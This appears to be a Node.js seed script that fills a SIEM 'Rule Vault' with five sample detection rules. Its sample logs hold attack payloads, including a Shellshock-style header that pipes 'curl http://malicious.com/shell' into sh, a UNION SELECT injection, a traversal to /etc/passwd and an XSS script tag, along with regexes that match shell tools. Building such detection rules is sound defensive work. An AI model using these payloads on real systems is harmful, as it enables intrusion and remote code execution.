const { PrismaClient } = require('@prisma/client');
const { PrismaBetterSqlite3 } = require('@prisma/adapter-better-sqlite3');
const Database = require('better-sqlite3');

const db = new Database('./prisma/dev.db');
const adapter = new PrismaBetterSqlite3({ url: './prisma/dev.db' });
const prisma = new PrismaClient({ adapter });

async function main() {
  console.log('Seeding Rule Vault...');

  const rules = [
    {
      sourceType: "SIEM_WEB_LOG",
      attackType: "SQL_INJECTION",
      sanitizedLog: 'GET /api/users?id=1%20UNION%20SELECT%20username%2Cpassword%20FROM%20users HTTP/1.1" 200 4523 "-" "Mozilla/5.0"',
      proposedCategory: "CWE-89: SQL Injection",
      suggestedPattern: "UNION\\s+SELECT",
      severity: "CRITICAL",
      confidence: 0.95,
      falsePositiveRisks: JSON.stringify(["Legitimate queries containing 'union' and 'select' words in text fields."]),
      status: "APPROVED",
      provenance: "Agent Lab Run: RV-AUTO-SEED-01",
      reviewedBy: "admin",
      reviewedAt: new Date(),
      reviewerNotes: "Classic union-based SQLi detected in SIEM logs. Approved for pattern matching."
    },
    {
      sourceType: "SIEM_WAF_LOG",
      attackType: "COMMAND_INJECTION",
      sanitizedLog: 'POST /upload HTTP/1.1" 400 120 "-" "() { :;}; /bin/bash -c \'curl http://malicious.com/shell | sh\'"',
      proposedCategory: "CWE-78: OS Command Injection",
      suggestedPattern: "(?:\\||\\|\\||&&|;)\\s*(?:bash|sh|wget|curl|nc)\\b.*-c",
      severity: "CRITICAL",
      confidence: 0.98,
      falsePositiveRisks: JSON.stringify(["Developers running legitimate curl commands from internal IP ranges."]),
      status: "APPROVED",
      provenance: "Agent Lab Run: RV-AUTO-SEED-02",
      reviewedBy: "admin",
      reviewedAt: new Date(),
      reviewerNotes: "Shellshock variant or direct command injection in User-Agent header."
    },
    {
      sourceType: "SIEM_AUTH_LOG",
      attackType: "CREDENTIAL_STUFFING",
      sanitizedLog: 'Failed password for invalid user admin from 192.168.1.100 port 49123 ssh2 (15 attempts in 2s)',
      proposedCategory: "CWE-307: Improper Restriction of Excessive Authentication Attempts",
      suggestedPattern: "Failed\\spassword\\sfor.*\\((\\d{2,})\\sattempts",
      severity: "HIGH",
      confidence: 0.85,
      falsePositiveRisks: JSON.stringify(["Users forgetting their passwords and retrying rapidly using automated password managers."]),
      status: "APPROVED",
      provenance: "Agent Lab Run: RV-AUTO-SEED-03",
      reviewedBy: "admin",
      reviewedAt: new Date(),
      reviewerNotes: "Brute force pattern clearly visible in rapid succession."
    },
    {
      sourceType: "SIEM_WEB_LOG",
      attackType: "PATH_TRAVERSAL",
      sanitizedLog: 'GET /download.php?file=../../../../etc/passwd HTTP/1.1" 200 1254 "-" "curl/7.68.0"',
      proposedCategory: "CWE-22: Path Traversal",
      suggestedPattern: "(?:\\.\\.[\\\\/]){2,}",
      severity: "HIGH",
      confidence: 0.92,
      falsePositiveRisks: JSON.stringify(["Legitimate URL parameters that contain '..' for backward navigation in custom apps."]),
      status: "APPROVED",
      provenance: "Agent Lab Run: RV-AUTO-SEED-04",
      reviewedBy: "admin",
      reviewedAt: new Date(),
      reviewerNotes: "Standard dot-dot-slash sequence attempting to access sensitive files."
    },
    {
      sourceType: "SIEM_APP_LOG",
      attackType: "CROSS_SITE_SCRIPTING",
      sanitizedLog: '192.168.1.50 - - [10/Jun/2026:10:00:00 +0000] "GET /search?q=<script>alert(\'XSS\')</script> HTTP/1.1" 200 452',
      proposedCategory: "CWE-79: Cross-site Scripting",
      suggestedPattern: "<script\\b[^>]*>.*?</script>",
      severity: "MEDIUM",
      confidence: 0.90,
      falsePositiveRisks: JSON.stringify(["Payloads injected into fields that are safely HTML encoded before rendering."]),
      status: "APPROVED",
      provenance: "Agent Lab Run: RV-AUTO-SEED-05",
      reviewedBy: "admin",
      reviewedAt: new Date(),
      reviewerNotes: "Reflected XSS payload via query parameter."
    }
  ];

  for (const rule of rules) {
    await prisma.ruleVaultEntry.create({
      data: rule
    });
  }

  console.log(`Successfully seeded ${rules.length} SIEM rules.`);
}

main()
  .catch((e) => {
    console.error(e);
    process.exit(1);
  })
  .finally(async () => {
    await prisma.$disconnect();
  });
